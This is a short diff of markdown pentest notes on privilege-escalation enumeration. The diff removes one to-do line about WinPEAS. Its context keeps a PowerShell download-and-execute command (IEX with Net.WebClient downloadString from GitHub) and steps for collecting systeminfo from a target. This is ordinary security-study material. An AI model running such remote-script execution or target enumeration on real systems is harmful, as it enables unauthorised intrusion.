@@ -80,8 +80,6 @@ IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/
 ```
 Read it with color-highlighting using `less -r linpeas.txt`
 
-> I still have to run WinPEAS once and check what additional commands I need to integrate from 2_loot-privEsc_Windows_Manually from the knowledgeBase 05.
-
 ##### Windows Exploit Suggester - Next Generation
 On target, execute `systeminfo > systeminfo.txt` and transfer file. On kali, do
 ```bash
